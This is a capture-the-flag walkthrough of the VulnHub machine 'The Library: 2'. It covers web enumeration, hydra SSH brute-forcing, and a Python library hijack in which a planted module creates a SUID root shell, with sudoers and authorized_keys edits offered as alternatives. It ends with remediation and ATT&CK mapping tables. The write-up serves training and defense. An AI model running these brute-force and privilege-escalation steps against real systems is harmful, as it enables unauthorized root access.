# The Library: 2 — Deeper Into the Stacks

Alright dudes!! The Library sequel cranks up the difficulty. This one layers web enumeration, Python library hijacking (yes, THAT path injection trick), and a proper lateral movement step before root. The Library: 2 is goated for teaching one of the most underrated Linux privesc vectors: writable directories in the Python module search path. No cap, this one shows up in real assessments way more than people expect.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | The Library: 2 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/the-library-2,lcb/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, SSH brute-force or credential discovery, Python library path hijacking (sys.path injection), cron-based privilege escalation |
| **CVEs** | CWE-427 (Uncontrolled Search Path Element — Python library hijacking), CWE-732 (Incorrect Permission Assignment for Critical Resource — writable cron script directory), CWE-522 (Insufficiently Protected Credentials) |
| **APT Groups** | APT28 (Fancy Bear): leverages Python path injection for persistence and privilege escalation on Linux servers; APT41: uses cron-based privilege escalation as a post-exploitation technique in compromised Linux environments |

---

## Attack Summary

```
nmap → ports 22 (SSH), 80 (HTTP)
  → HTTP: web application (possible WordPress or custom CMS)
  → gobuster: enumerate directories and files
  → credential discovery via web source or enumeration
  → SSH: initial access as low-privilege user
  → sudo -l or SUID enumeration
  → Python script running as root via cron
  → writable directory in Python sys.path
  → Python library hijacking → inject malicious module
  → cron triggers script → root code execution
  → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web application fingerprinting and directory enumeration
3. Credential discovery via web application or enumeration
4. SSH initial access as low-privilege user
5. Post-exploitation: enumerate sudo rights, SUID, cron jobs
6. Python library path hijacking for privilege escalation
7. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.x

nmap -sV -sC -p- 192.168.1.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: SSH (end goal) and HTTP (primary attack surface). No FTP this time: the difficulty step up removes the easy FTP vector and forces deeper web and post-exploitation enumeration.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Application Enumeration

```bash
curl -s http://192.168.1.x/ | head -50

gobuster dir \
  -u http://192.168.1.x/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 40 \
  -o /tmp/library2_dirs.txt

# For WordPress detection:
wpscan --url http://192.168.1.x/ --enumerate u,p,t
```

Look for: user enumeration, hidden admin pages, configuration files in web root, backup files (`.bak`, `.old`, `~`).

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — Credential Discovery and Initial SSH Access

The web application may expose credentials through:
- Source code comments with passwords
- Robots.txt disclosing sensitive paths
- Admin panel with default credentials
- WordPress user enumeration leading to brute-force

```bash
# WordPress user enumeration:
wpscan --url http://192.168.1.x/ --enumerate u

# SSH brute-force with discovered usernames:
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x -t 4

# Or try common web default credentials for discovered login forms
```

Once credentials are obtained, SSH in:

```bash
ssh <username>@192.168.1.x
```

**Real-world note:** Username enumeration via WordPress REST API and login error messages is a consistent initial access vector. Organizations running WordPress without hardening regularly expose user lists that feed brute-force attacks. APT28 specifically uses WordPress installations as initial access targets.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1110.001 — Brute Force: Password Guessing

---

## Step 4 — Post-Exploitation Enumeration

With a shell on the system, enumerate privilege escalation vectors systematically:

```bash
# Sudo rights
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v run

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Running processes
ps aux | grep root

# Python scripts run by root
find / -name "*.py" -user root -writable 2>/dev/null
find / -name "*.py" 2>/dev/null | xargs ls -la 2>/dev/null | grep -v "Permission denied"
```

The key finding: a Python script runs periodically as root (via cron). The script imports a Python module from a directory that is writable by the current user.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1057 — Process Discovery

---

## Step 5 — Python Library Hijacking

Python resolves module imports by searching directories in `sys.path` in order. If the first writable directory in `sys.path` for the cron script is user-writable, you can plant a malicious module that executes arbitrary code when the root cron job imports it.

Identify the Python script and its imports:

```bash
cat /path/to/root_script.py
# Look for: import <module_name>
```

Check the Python sys.path for the script's Python version:

```bash
python3 -c "import sys; print(sys.path)"
# or
python -c "import sys; print(sys.path)"
```

Find the writable directory that appears before the legitimate module location:

```bash
# Example: if sys.path includes /home/<user>/lib and that's writable:
ls -la /home/<user>/lib/
```

Create a malicious module in the writable directory with the same name as the imported module:

```bash
cat > /writable/path/<module_name>.py << 'EOF'
import os
import pty

# Payload: add current user to sudoers or create SUID bash
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF
```

Wait for the cron job to execute (check interval: usually 1-5 minutes), then escalate:

```bash
# After cron runs:
/tmp/rootbash -p
# uid=0(root)
```

**Alternative payload:** Instead of SUID bash, add the user to /etc/sudoers or write an SSH key to /root/.ssh/authorized_keys.

**Real-world note:** Python library path hijacking is one of the most reliable Linux privilege escalation techniques in environments running Python-based automation as root. APT28 uses this technique for persistence on Linux servers with Python-based management scripts. The fix requires strict sys.path control and file permission hardening.

**MITRE ATT&CK:** T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking (analogous: Python path); T1053.003 — Scheduled Task: Cron

---

## Step 6 — Root Access and Flag

```bash
/tmp/rootbash -p
# uid=<uid>(user) gid=<gid>(user) euid=0(root) egid=0(root)

id
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. The Library's deepest section is open.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| SSH credential | discovered via web enumeration | web app / brute-force | SSH initial access |
| Root flag | flag.txt | /root/flag.txt | completion |
| SUID rootbash | /tmp/rootbash | created via Python hijack | root shell |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials exposed via web enumeration | WordPress user enumeration affects millions of production sites; login error messages confirm valid usernames | Implement generic error messages for auth failures; enable WordPress user enumeration protection; use fail2ban |
| 2 | Python library path hijacking via writable directory | Cron jobs running Python scripts as root with writable sys.path directories are a critical misconfiguration | Run scripts from controlled virtualenvs; ensure sys.path directories are owned by root and not world-writable |
| 3 | Cron job privilege escalation | Cron jobs running as root with writable scripts or dependencies are consistently exploitable | Audit all cron jobs for file permission issues: `find /etc/cron* -writable 2>/dev/null` |
| 4 | Python import hijacking | Python's module resolution order makes any writable directory before system paths a persistence and escalation target | Set PYTHONPATH explicitly in cron environments; use absolute imports; run under restricted users |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | Scheduled Task Discovery | T1053.003 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: Python Path | T1574.006 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Harden web application credential exposure** — generic auth error messages; disable WordPress user enumeration; implement account lockout
2. **Restrict Python sys.path for cron scripts** — run in dedicated virtualenv; set PYTHONPATH explicitly; ensure all sys.path directories are root-owned and not writable by non-root users
3. **Audit cron job file permissions** — `find /etc/cron* /var/spool/cron -writable 2>/dev/null`; scripts executed as root must not be writable by non-root users
4. **Enforce principle of least privilege for cron** — cron jobs should run under the lowest-privilege user that can accomplish the task
5. **Apply brute-force protections** — fail2ban for SSH; account lockout policies for web applications

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all cron jobs and their running users |
| Protect | Access Control | Restrict cron script directories; virtualenv for Python cron jobs |
| Protect | Identity Management | Unique strong passwords; MFA for SSH where possible |
| Detect | Anomalies and Events | Alert on cron job failures and unexpected Python script executions |
| Respond | Response Planning | Remove malicious modules; rotate credentials; rebuild cron permissions |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | Cron jobs run under minimum required user; no root cron for non-essential tasks |
| CM-6 | Configuration Settings | Harden Python sys.path; restrict writable directories in cron environments |
| IA-5 | Authenticator Management | Brute-force protections for SSH and web auth; unique passwords |
| SI-7 | Software, Firmware, and Information Integrity | File integrity monitoring on cron scripts and Python modules |
| AU-12 | Audit Record Generation | Log cron job executions and Python import errors |

### CISA KEV

Python library hijacking and cron-based privilege escalation map to CISA Alert AA21-116A patterns describing threat actor post-exploitation techniques in Linux environments. Organizations should audit cron job configurations as part of regular security assessments.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Configurations | MIL2 |

### MITRE D3FEND

- **D3-EAL** — Execution Allowlisting (allowlist Python scripts run by cron; block unexpected modules)
- **D3-OAM** — Operating System Administrative Management (least-privilege cron users; sys.path hardening)
- **D3-FIM** — File Integrity Monitoring (detect modifications to Python modules in cron paths)

---

## Final Thoughts

The Library: 2 teaches the kind of privilege escalation that humbles experienced pentesters. Python library hijacking is not obvious, it requires understanding how Python resolves imports, and it's everywhere in real environments. Any organization running Python-based automation as root without strict path controls is vulnerable.

The machine respects the sequel convention: harder entry, more sophisticated escalation, same clean design. If Library 1 taught you to look at configs, Library 2 teaches you to look at how scripts resolve their dependencies.

Thanks guys!! (❍ᴥ❍ʋ)
